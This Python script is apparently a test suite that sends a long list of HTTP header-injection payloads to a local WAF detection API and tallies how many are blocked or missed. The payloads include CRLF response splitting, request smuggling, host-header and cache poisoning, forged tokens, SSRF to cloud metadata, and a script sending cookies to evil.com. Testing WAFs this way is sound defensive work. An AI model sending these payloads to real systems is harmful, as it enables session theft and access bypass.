#!/usr/bin/env python3
"""
HTTP Header Injection & CRLF Attack Test Suite
Tests header injection and response splitting techniques against the WAF
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# Header Injection & CRLF Payloads
HEADER_INJECTION_ATTACKS = [
    # Basic CRLF Injection
    {"name": "Basic CRLF newline", "path": "/api/redirect", "query": {"url": "http://example.com%0d%0aX-Injected: true"}},
    {"name": "CRLF Set-Cookie", "path": "/api/login", "query": {"next": "/%0d%0aSet-Cookie: session=evil"}},
    {"name": "CRLF Location", "path": "/api/goto", "query": {"dest": "/%0d%0aLocation: http://evil.com"}},
    {"name": "Double CRLF body", "path": "/api/return", "query": {"url": "http://x%0d%0a%0d%0a<script>alert(1)</script>"}},
    {"name": "URL encoded CRLF", "path": "/api/forward", "query": {"to": "http://test.com%0D%0AX-Attack: true"}},
    {"name": "Unicode CRLF", "path": "/api/link", "query": {"url": "http://test.com\r\nX-Injected: header"}},

    # Response Splitting
    {"name": "Response split basic", "path": "/api/page", "query": {"name": "test%0d%0a%0d%0a<html>Fake</html>"}},
    {"name": "Response split XSS", "path": "/api/view", "query": {"id": "1%0d%0a%0d%0a<script>alert(1)</script>"}},
    {"name": "Response split redirect", "path": "/api/nav", "query": {"url": "test%0d%0aLocation:%20http://evil.com%0d%0a%0d%0a"}},
    {"name": "Response split cookie", "path": "/api/set", "query": {"value": "x%0d%0aSet-Cookie:%20admin=true%0d%0a%0d%0a"}},

    # Header Overwrite
    {"name": "Host header poison", "path": "/api/reset", "headers": {"Host": "evil.com"}},
    {"name": "X-Forwarded-Host poison", "path": "/api/password", "headers": {"X-Forwarded-Host": "evil.com"}},
    {"name": "X-Forwarded-Proto", "path": "/api/secure", "headers": {"X-Forwarded-Proto": "http"}},
    {"name": "X-Original-URL", "path": "/api/admin", "headers": {"X-Original-URL": "/admin/delete"}},
    {"name": "X-Rewrite-URL", "path": "/api/user", "headers": {"X-Rewrite-URL": "/admin"}},
    {"name": "X-Custom-IP-Auth", "path": "/api/internal", "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},

    # Request Smuggling Patterns
    {"name": "CL.TE smuggle", "path": "/api/smuggle", "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"}},
    {"name": "TE.CL smuggle", "path": "/api/tunnel", "headers": {"Transfer-Encoding": "chunked", "Content-Length": "3"}},
    {"name": "TE.TE obfuscation", "path": "/api/proxy", "headers": {"Transfer-Encoding": "chunked", "Transfer-encoding": "identity"}},
    {"name": "Double Content-Length", "path": "/api/parse", "headers": {"Content-Length": "0", "Content-Length": "44"}},

    # Cache Poisoning
    {"name": "Cache key poison", "path": "/api/static/script.js", "headers": {"X-Forwarded-Host": "evil.com"}},
    {"name": "Web cache deception", "path": "/api/account/settings.css", "headers": {"Accept": "text/css"}},
    {"name": "Cache via X-Forwarded-Scheme", "path": "/api/resource", "headers": {"X-Forwarded-Scheme": "nothttps"}},
    {"name": "Vary header abuse", "path": "/api/profile", "headers": {"Origin": "https://evil.com"}},

    # Cookie Injection
    {"name": "Cookie injection CRLF", "path": "/api/session", "query": {"token": "valid%0d%0aSet-Cookie: admin=true"}},
    {"name": "Cookie overflow", "path": "/api/prefs", "headers": {"Cookie": "a=" + "B" * 4096}},
    {"name": "Cookie attribute inject", "path": "/api/auth", "query": {"session": "x; Path=/; Domain=.evil.com"}},
    {"name": "Cookie SameSite bypass", "path": "/api/csrf", "headers": {"Cookie": "session=x; SameSite=None"}},

    # Authentication Header Attacks
    {"name": "Basic auth injection", "path": "/api/private", "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="}},
    {"name": "Bearer token forge", "path": "/api/secure", "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."}},
    {"name": "JWT none algorithm", "path": "/api/jwt", "headers": {"Authorization": "Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."}},
    {"name": "NTLM relay", "path": "/api/windows", "headers": {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}},

    # CORS Header Manipulation
    {"name": "CORS wildcard origin", "path": "/api/cors", "headers": {"Origin": "https://evil.com"}},
    {"name": "CORS null origin", "path": "/api/data", "headers": {"Origin": "null"}},
    {"name": "CORS reflection", "path": "/api/cross", "headers": {"Origin": "https://attacker.com"}},
    {"name": "CORS credentials", "path": "/api/sensitive", "headers": {"Origin": "https://evil.com", "Access-Control-Request-Credentials": "true"}},

    # Content-Type Attacks
    {"name": "Content-Type confusion", "path": "/api/upload", "headers": {"Content-Type": "text/html"}},
    {"name": "MIME sniffing", "path": "/api/file", "headers": {"Content-Type": "application/octet-stream", "X-Content-Type-Options": ""}},
    {"name": "Charset injection", "path": "/api/text", "headers": {"Content-Type": "text/html; charset=UTF-7"}},
    {"name": "Multipart boundary", "path": "/api/form", "headers": {"Content-Type": "multipart/form-data; boundary=evil"}},

    # Method Override
    {"name": "X-HTTP-Method-Override", "path": "/api/resource", "headers": {"X-HTTP-Method-Override": "DELETE"}},
    {"name": "X-Method-Override", "path": "/api/item", "headers": {"X-Method-Override": "PUT"}},
    {"name": "Override to TRACE", "path": "/api/debug", "headers": {"X-HTTP-Method-Override": "TRACE"}},
    {"name": "Override to CONNECT", "path": "/api/tunnel", "headers": {"X-HTTP-Method-Override": "CONNECT"}},

    # Server-Side Includes (SSI)
    {"name": "SSI include", "path": "/api/template", "headers": {"X-SSI-Inject": "<!--#include virtual=\"/etc/passwd\" -->"}},
    {"name": "SSI exec", "path": "/api/render", "query": {"name": "<!--#exec cmd=\"id\" -->"}},
    {"name": "ESI injection", "path": "/api/cache", "headers": {"Surrogate-Control": "<esi:include src=\"http://evil.com/\"/>"}},

    # Log Injection
    {"name": "Log injection newline", "path": "/api/log", "headers": {"User-Agent": "Mozilla\n[CRITICAL] Fake log entry"}},
    {"name": "Log injection format", "path": "/api/audit", "headers": {"User-Agent": "%n%n%n%n%n"}},
    {"name": "Log injection XSS", "path": "/api/access", "headers": {"Referer": "<script>alert(1)</script>"}},

    # Email Header Injection
    {"name": "Email header inject", "path": "/api/contact", "body": {"email": "test@test.com%0d%0aBcc: attacker@evil.com"}},
    {"name": "Email subject inject", "path": "/api/feedback", "body": {"subject": "Hello%0d%0aBcc: attacker@evil.com%0d%0a"}},
    {"name": "SMTP injection", "path": "/api/notify", "body": {"to": "victim@test.com\r\nRCPT TO: attacker@evil.com"}},

    # Encoding Variations
    {"name": "UTF-8 CRLF", "path": "/api/encode", "query": {"data": "test\xc4\x8d\xc4\x8aX-Injected: true"}},
    {"name": "Double encode CRLF", "path": "/api/decode", "query": {"url": "%250d%250aSet-Cookie:%20evil=true"}},
    {"name": "Null byte header", "path": "/api/null", "query": {"param": "value%00%0d%0aX-Injected: true"}},
    {"name": "Tab character", "path": "/api/tab", "query": {"value": "test%09%0d%0aX-Injected: true"}},

    # Hidden in legitimate requests
    {"name": "Redirect param CRLF", "path": "/api/oauth/callback", "query": {"redirect_uri": "http://app.com%0d%0aSet-Cookie:%20token=stolen"}},
    {"name": "Filename header inject", "path": "/api/download", "query": {"file": "report.pdf%0d%0aContent-Disposition:%20attachment;filename=evil.exe"}},
    {"name": "Language header inject", "path": "/api/i18n", "headers": {"Accept-Language": "en%0d%0aX-Injected: true"}},

    # --- Extended CRLF payloads from PayloadsAllTheThings ---
    {"name": "PAT CRLF %%0a0a", "path": "/api/redirect", "query": {"url": "/%%0a0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %0a only", "path": "/api/redirect", "query": {"url": "/%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %0d%0a", "path": "/api/redirect", "query": {"url": "/%0d%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %0d only", "path": "/api/redirect", "query": {"url": "/%0dSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %23%0a", "path": "/api/redirect", "query": {"url": "/%23%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %23%0d%0a", "path": "/api/redirect", "query": {"url": "/%23%0d%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %23%0d", "path": "/api/redirect", "query": {"url": "/%23%0dSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %25%30%61", "path": "/api/redirect", "query": {"url": "/%25%30%61Set-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %25%30a", "path": "/api/redirect", "query": {"url": "/%25%30aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %250a", "path": "/api/redirect", "query": {"url": "/%250aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %25250a", "path": "/api/redirect", "query": {"url": "/%25250aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF traversal", "path": "/api/redirect", "query": {"url": "/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF revtraversal", "path": "/api/redirect", "query": {"url": "/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %2F..", "path": "/api/redirect", "query": {"url": "/%2F..%0d%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %3f", "path": "/api/redirect", "query": {"url": "/%3f%0d%0aSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %3f%0d", "path": "/api/redirect", "query": {"url": "/%3f%0dSet-Cookie:crlf=injection"}},
    {"name": "PAT CRLF %u000a", "path": "/api/redirect", "query": {"url": "/%u000aSet-Cookie:crlf=injection"}},

    # --- CRLF in different parameter positions ---
    {"name": "CRLF in next param", "path": "/api/login", "query": {"next": "/%0d%0aSet-Cookie:admin=true"}},
    {"name": "CRLF in dest param", "path": "/api/goto", "query": {"dest": "/%0d%0aLocation:http://evil.com"}},
    {"name": "CRLF in return param", "path": "/api/auth", "query": {"return_url": "http://app.com%0d%0aX-Injected:true"}},
    {"name": "CRLF in callback param", "path": "/api/sso", "query": {"callback": "http://app.com%0d%0aSet-Cookie:session=evil"}},
    {"name": "CRLF in continue param", "path": "/api/checkout", "query": {"continue": "/%0d%0aSet-Cookie:cart=hacked"}},

    # --- UTF-8 overlong encoding CRLF ---
    {"name": "UTF-8 overlong CR", "path": "/api/page", "query": {"url": "http://x%E5%98%8D%E5%98%8ASet-Cookie:evil=true"}},
    {"name": "UTF-8 Fullwidth CRLF", "path": "/api/page", "query": {"url": "http://x\uff0d\uff0aSet-Cookie:evil=true"}},
    {"name": "UTF-8 Hangul CRLF", "path": "/api/page", "query": {"url": "http://x%E5%98%8A%E5%98%8DSet-Cookie:crlf=utf8"}},
    {"name": "UTF-8 three-byte CRLF", "path": "/api/redirect", "query": {"url": "http://x%c4%8d%c4%8aSet-Cookie:evil=true"}},

    # --- Response splitting with varied headers ---
    {"name": "Split Access-Control", "path": "/api/cors", "query": {"origin": "evil%0d%0aAccess-Control-Allow-Origin:%20*"}},
    {"name": "Split Content-Disp", "path": "/api/file", "query": {"name": "file.txt%0d%0aContent-Disposition:%20attachment;%20filename=evil.exe"}},
    {"name": "Split Content-Type", "path": "/api/render", "query": {"type": "text%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"}},
    {"name": "Split X-Frame-Options", "path": "/api/embed", "query": {"url": "http://x%0d%0aX-Frame-Options:%20ALLOW-FROM%20http://evil.com"}},
    {"name": "Split CSP header", "path": "/api/policy", "query": {"csp": "default%0d%0aContent-Security-Policy:%20script-src%20*"}},

    # --- Request smuggling advanced variants ---
    {"name": "CL.TE space prefix", "path": "/api/data", "headers": {"Content-Length": "6", "Transfer-Encoding": " chunked"}},
    {"name": "TE.CL tab obfusc", "path": "/api/data", "headers": {"Transfer-Encoding": "chunked", "Content-Length": "3"}},
    {"name": "TE.TE newline", "path": "/api/data", "headers": {"Transfer-Encoding": "chunked\r\n", "Transfer-Encoding": "identity"}},
    {"name": "TE comma variant", "path": "/api/data", "headers": {"Transfer-Encoding": "chunked, identity"}},
    {"name": "TE semicolon", "path": "/api/data", "headers": {"Transfer-Encoding": "chunked;q=1.0"}},
    {"name": "TE with junk", "path": "/api/data", "headers": {"Transfer-Encoding": "xchunked"}},
    {"name": "TE case variation", "path": "/api/data", "headers": {"Transfer-Encoding": "Chunked"}},
    {"name": "TE null byte", "path": "/api/data", "headers": {"Transfer-Encoding": "chunked\x00"}},
    {"name": "Double TE with space", "path": "/api/data", "headers": {"Transfer-Encoding": "chunked", "Transfer-encoding": " chunked"}},

    # --- Host header poisoning extended ---
    {"name": "Host double injection", "path": "/api/reset", "headers": {"Host": "legit.com", "Host": "evil.com"}},
    {"name": "Host with port", "path": "/api/password-reset", "headers": {"Host": "evil.com:443"}},
    {"name": "Host absolute URL", "path": "/api/verify", "headers": {"Host": "evil.com", "X-Forwarded-Host": "evil.com"}},
    {"name": "Host via X-Host", "path": "/api/confirm", "headers": {"X-Host": "evil.com"}},
    {"name": "Host via X-Forwarded-Server", "path": "/api/redirect", "headers": {"X-Forwarded-Server": "evil.com"}},
    {"name": "Host via X-HTTP-Host-Override", "path": "/api/link", "headers": {"X-HTTP-Host-Override": "evil.com"}},
    {"name": "Host via Forwarded", "path": "/api/auth", "headers": {"Forwarded": "host=evil.com"}},

    # --- IP spoofing headers ---
    {"name": "XFF localhost", "path": "/api/admin", "headers": {"X-Forwarded-For": "127.0.0.1"}},
    {"name": "XFF internal 10.x", "path": "/api/internal", "headers": {"X-Forwarded-For": "10.0.0.1"}},
    {"name": "XFF internal 192.x", "path": "/api/admin/users", "headers": {"X-Forwarded-For": "192.168.1.1"}},
    {"name": "X-Real-IP spoof", "path": "/api/admin", "headers": {"X-Real-IP": "127.0.0.1"}},
    {"name": "X-Client-IP spoof", "path": "/api/internal", "headers": {"X-Client-IP": "127.0.0.1"}},
    {"name": "X-Originating-IP spoof", "path": "/api/debug", "headers": {"X-Originating-IP": "127.0.0.1"}},
    {"name": "Client-IP spoof", "path": "/api/admin", "headers": {"Client-IP": "127.0.0.1"}},
    {"name": "True-Client-IP spoof", "path": "/api/internal", "headers": {"True-Client-IP": "127.0.0.1"}},

    # --- WebSocket upgrade attacks ---
    {"name": "WS upgrade smuggle", "path": "/api/ws", "headers": {"Upgrade": "websocket", "Connection": "Upgrade", "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="}},
    {"name": "H2C upgrade smuggle", "path": "/api/data", "headers": {"Upgrade": "h2c", "HTTP2-Settings": "AAEAAEAAAAIAAAABAAMAAABkAAQBAAAAAAUAAEAA"}},
    {"name": "HTTP upgrade attack", "path": "/api/proxy", "headers": {"Upgrade": "HTTP/2.0", "Connection": "Upgrade"}},

    # --- Session fixation via headers ---
    {"name": "Session fixation cookie", "path": "/api/login", "headers": {"Cookie": "JSESSIONID=attacker_controlled_session_id"}},
    {"name": "Session fixation set", "path": "/api/auth", "query": {"session": "fixed_session_value%0d%0aSet-Cookie:%20PHPSESSID=evil"}},

    # --- HTTP/2 specific attacks ---
    {"name": "H2 pseudo header inject", "path": "/api/data", "headers": {":authority": "evil.com", ":scheme": "https"}},
    {"name": "H2 method override", "path": "/api/resource", "headers": {":method": "DELETE", "X-HTTP-Method": "GET"}},
    {"name": "H2 path traversal", "path": "/api/data", "headers": {":path": "/../admin/delete"}},

    # --- Range header abuse ---
    {"name": "Range overlap DoS", "path": "/api/download/large.pdf", "headers": {"Range": "bytes=0-1000,500-1500,1000-2000,1500-2500"}},
    {"name": "Range many ranges", "path": "/api/file", "headers": {"Range": ",".join([f"bytes={i}-{i+1}" for i in range(0, 200, 2)])}},
    {"name": "Range negative", "path": "/api/data", "headers": {"Range": "bytes=-1-0"}},

    # --- Trailer header injection ---
    {"name": "Trailer header inject", "path": "/api/stream", "headers": {"Trailer": "X-Injected", "TE": "trailers"}},
    {"name": "Trailer smuggle", "path": "/api/data", "headers": {"Trailer": "Transfer-Encoding", "TE": "trailers, chunked"}},

    # --- Content negotiation attacks ---
    {"name": "Accept type confusion", "path": "/api/data.json", "headers": {"Accept": "text/html, application/xhtml+xml"}},
    {"name": "Accept-Charset attack", "path": "/api/page", "headers": {"Accept-Charset": "utf-7"}},
    {"name": "Accept-Encoding bomb", "path": "/api/data", "headers": {"Accept-Encoding": "gzip, deflate, br, zstd, identity, *"}},

    # --- Proxy/CDN confusion headers ---
    {"name": "X-Forwarded-Proto http", "path": "/api/secure", "headers": {"X-Forwarded-Proto": "http", "X-Forwarded-Ssl": "off"}},
    {"name": "Front-End-Https off", "path": "/api/login", "headers": {"Front-End-Https": "off"}},
    {"name": "X-Forwarded-Port 80", "path": "/api/secure", "headers": {"X-Forwarded-Port": "80"}},
    {"name": "Via header poison", "path": "/api/cache", "headers": {"Via": "1.1 evil-proxy.com"}},

    # --- Server-side include (SSI) extended ---
    {"name": "SSI printenv", "path": "/api/page", "headers": {"X-SSI": "<!--#printenv -->"}},
    {"name": "SSI config", "path": "/api/page", "query": {"name": "<!--#config timefmt=\"%D\" -->"}},
    {"name": "SSI set variable", "path": "/api/page", "query": {"input": "<!--#set var=\"DOCUMENT_URI\" value=\"/admin\" -->"}},
    {"name": "SSI if directive", "path": "/api/template", "query": {"name": "<!--#if expr=\"1\" -->ADMIN<!--#endif -->"}},
    {"name": "ESI include remote", "path": "/api/cache", "headers": {"Surrogate-Control": "content=\"ESI/1.0\""}},
    {"name": "ESI inline fragment", "path": "/api/page", "query": {"content": "<esi:include src=\"http://evil.com/steal\" />"}},
    {"name": "ESI onerror", "path": "/api/render", "query": {"tpl": "<esi:include src=x onerror=\"continue\" />"}},

    # --- Log/CRLF injection in common headers ---
    {"name": "Referer CRLF inject", "path": "/api/page", "headers": {"Referer": "http://legit.com\r\n[CRITICAL] Admin access granted"}},
    {"name": "UA CRLF inject", "path": "/api/page", "headers": {"User-Agent": "Mozilla/5.0\r\nX-Admin: true\r\n\r\n"}},
    {"name": "Cookie CRLF inject", "path": "/api/page", "headers": {"Cookie": "session=abc\r\nSet-Cookie: admin=true"}},
    {"name": "X-Custom CRLF inject", "path": "/api/page", "headers": {"X-Custom": "value\r\nX-Injected: malicious"}},

    # --- HTTP verb tampering ---
    {"name": "TRACE method", "path": "/api/debug", "headers": {"X-HTTP-Method": "TRACE"}},
    {"name": "CONNECT tunnel", "path": "/api/proxy", "headers": {"X-HTTP-Method": "CONNECT"}},
    {"name": "PATCH override", "path": "/api/user/1", "headers": {"X-HTTP-Method-Override": "PATCH"}},
    {"name": "PROPFIND WebDAV", "path": "/api/resource", "headers": {"X-Method-Override": "PROPFIND"}},
    {"name": "COPY WebDAV", "path": "/api/file", "headers": {"X-HTTP-Method-Override": "COPY", "Destination": "/api/admin"}},

    # --- Mixed/chained attacks ---
    {"name": "CRLF + XSS chain", "path": "/api/page", "query": {"url": "http://x%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>document.location='http://evil.com/?c='+document.cookie</script>"}},
    {"name": "CRLF + session fix", "path": "/api/login", "query": {"next": "/%0d%0aSet-Cookie:%20PHPSESSID=attacker_session;%20Path=/;%20HttpOnly"}},
    {"name": "Smuggle + SSRF", "path": "/api/proxy", "headers": {"Transfer-Encoding": "chunked", "Content-Length": "0"}, "body": {"url": "http://169.254.169.254/latest/meta-data/"}},
    {"name": "Host + cache poison", "path": "/static/app.js", "headers": {"Host": "evil.com", "X-Forwarded-Host": "evil.com", "X-Forwarded-Proto": "https"}},
    {"name": "XFF + admin bypass", "path": "/api/admin/panel", "headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"}},
]

def test_payload(attack: Dict) -> Dict:
    """Test a single header injection payload against WAF"""
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Content-Type": "application/json"
    }

    # Merge attack headers with base headers
    headers = {**base_headers, **attack.get("headers", {})}

    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": headers
    }

    body = attack.get("body")
    if body:
        payload["body"] = json.dumps(body) if isinstance(body, dict) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("HTTP HEADER INJECTION & CRLF ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(HEADER_INJECTION_ATTACKS)} header injection payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(HEADER_INJECTION_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(HEADER_INJECTION_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(HEADER_INJECTION_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(HEADER_INJECTION_ATTACKS) - errors) * 100 if (len(HEADER_INJECTION_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
